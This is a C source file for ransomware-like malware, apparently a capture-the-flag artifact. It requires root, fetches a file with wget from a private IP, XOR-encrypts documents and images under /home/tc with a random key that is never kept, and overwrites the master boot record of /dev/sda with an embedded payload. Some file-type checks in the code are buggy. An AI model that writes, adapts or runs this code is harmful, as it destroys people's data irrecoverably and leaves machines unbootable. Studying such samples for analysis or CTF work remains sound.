#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/reboot.h>

#define KEY_SIZE 1024

extern char _binary_mbrapp_mbr_start[];
extern char _binary_mbrapp_mbr_end[];
extern char _binary_mbrapp_mbr_size[];

dev_t root_dev;
const char *mbr_start, *mbr_end;
char encrypt_key[KEY_SIZE];
int mbr_size;

static char target_ext[][10] = {
	".txt", ".bin",
	// picture
	".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
	// documents
	".doc", ".docx", ".docm", 
	".xls", ".xlsx", ".xlsm", 
	".ppt", ".pptx", ".pptm",
	".odt", ".pdf", ".xml",
};

void encrypt(char *path) {
	FILE *fp;
	int i;
	char *buf;
	int size;

	if((fp = fopen(path, "r+")) == NULL) {
		perror("fopen");
		return;
	}
	fseek(fp, 0, SEEK_END);
	size = ftell(fp);

	buf = (char*)malloc(size*sizeof(char));
	fseek(fp, 0, SEEK_SET);
	fread(buf, 1, size, fp);

	for(i = 0; i < size; i++) {
		buf[i] = buf[i]^encrypt_key[i%KEY_SIZE];
	}

	fseek(fp, 0, SEEK_SET);
	fwrite(buf, 1, size, fp);

	free(buf);
	fclose(fp);
}

void get_root_dev(void) {
	struct stat st;

	if(stat("/home", &st)) {
		perror("stat");
		return;
	}

	root_dev = st.st_dev;
}

void get_key() {
	FILE *fp;

	if((fp = fopen("/dev/urandom", "r")) == NULL) {
		perror("fopen");
	}
	if(fread(encrypt_key, 1, KEY_SIZE, fp) < KEY_SIZE) {
		perror("fread");
	}

	fclose(fp);
}

void recdir(char *path) {
	DIR *dp;
	struct dirent *dent;
	struct stat st;
	char *tmp;
	int len1, len2, addslash;
	int i;

	if((dp = opendir(path)) == NULL) {
		perror("opendir");
		return;
	}

	while((dent = readdir(dp)) != NULL) {
		if(!strcmp(dent->d_name, ".")) {
			continue;
		}
		if(!strcmp(dent->d_name, "..")) {
			continue;
		}

		len1 = strlen(path);
		len2 = strlen(dent->d_name);
		addslash = (path[len1-1] != '/')?1:0;

		tmp = (char*)malloc(len1+len2+2);

		strcpy(tmp, path);
		if(addslash) strcat(tmp, "/");
		strcpy(tmp+len1+addslash, dent->d_name);

		if(stat(tmp, &st)) {
			perror("stat");
			free(tmp);
			continue;
		}

		if(st.st_dev != root_dev // file on virtual file system
				|| st.st_mode & S_IFMT == S_IFBLK
				|| st.st_mode & S_IFMT == S_IFCHR
				|| st.st_mode & S_IFMT == S_IFIFO
				|| st.st_mode & S_IFMT == S_IFLNK
				|| st.st_mode & S_IFMT == S_IFREG
				|| st.st_mode & S_IFMT == S_IFSOCK ) { // ignore files
			continue;
		}

		if ((st.st_mode & S_IFMT) == S_IFDIR) { // directory
			recdir(tmp);
		}
		else { // file
			for(i = 0; i < sizeof(target_ext)/sizeof(char*); i++) {
				if(strstr(tmp, target_ext[i])-tmp == strlen(tmp)-strlen(target_ext[i])) {
					encrypt(tmp);
				}
			}
		}

		free(tmp);
	}
	closedir(dp);
}


int main(int argc, char **argv) {
	char tmp[0x100];
	FILE *fp;

	if(getuid() != 0) {
		fprintf(stderr, "Please run as root.\n");
		exit(-1);
	}

	// remove(argv[0]);
	system("wget http://172.17.0.1/h1dd3n_s3cr3t_f14g.jpg");

	get_root_dev();
	get_key();

	recdir("/home/tc");
	
	mbr_start = _binary_mbrapp_mbr_start;
	mbr_end = _binary_mbrapp_mbr_end;
	mbr_size = (int)_binary_mbrapp_mbr_size;

	// overwrite mbr
	// sprintf(tmp, "/sys/dev/block/%d:%d", major(root_dev), minor(root_dev));
	if((fp = fopen("/dev/sda", "r+"))== NULL) {
		perror("fopen");
		return;
	}
	fwrite(mbr_start, 1, mbr_size, fp);
	fclose(fp);

	// system("reboot");
	// reboot(LINUX_REBOOT_CMD_RESTART);

	return 0;
}
